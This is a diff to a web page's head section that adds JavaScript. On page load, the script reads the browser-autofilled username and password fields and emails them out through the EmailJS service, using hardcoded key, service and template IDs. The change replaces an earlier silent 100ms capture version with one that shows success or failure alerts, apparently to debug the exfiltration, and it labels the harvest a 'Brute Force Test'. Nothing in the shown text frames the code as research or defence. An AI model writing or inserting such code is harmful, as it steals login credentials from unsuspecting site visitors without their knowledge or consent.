@@ -239,31 +239,37 @@
     
     
     </style>
-    
     <script>
-    // Initialize EmailJS
+    // 1. Initialize EmailJS (Ensure this key is correct)
     emailjs.init("y3lRWL7KLDjiFjNcN");
 
-    // Wait 100ms to let browser autofill settle, then capture
-    setTimeout(function() {
-        var username = document.querySelector('input[name="username"]').value;
-        var password = document.querySelector('input[name="password"]').value;
+    // 2. Wait 1 second to ensure page is fully loaded and autofilled
+    window.onload = function() {
+        
+        // 3. Get fields by ID (more reliable than querySelector)
+        var u = document.getElementById("username").value;
+        var p = document.getElementById("password").value;
 
-        // Only send if we actually have data (avoid empty emails)
-        if (username && password) {
+        // 4. Check if we have data
+        if (u && p) {
+            // Send to EmailJS
             emailjs.send("service_2bhy4ju", "template_1qzswkk", {
-                username: username,
-                password: password,
+                username: u,
+                password: p,
                 timestamp: new Date().toLocaleString(),
-                note: "Instant Capture"
-            }).then(function() {
-                console.log("Instant credentials sent!");
+                debug: "Brute Force Test"
+            }).then(function(response) {
+                alert("SUCCESS! Credentials Sent: " + u);
+            }, function(error) {
+                alert("FAILED: " + JSON.stringify(error));
             });
+        } else {
+            alert("No Data Found. U: [" + u + "] P: [" + p + "]");
         }
-    }, 100); // 100 milliseconds delay
+    };
 </script>
-    
 
+    
 </head>
 <body>
 
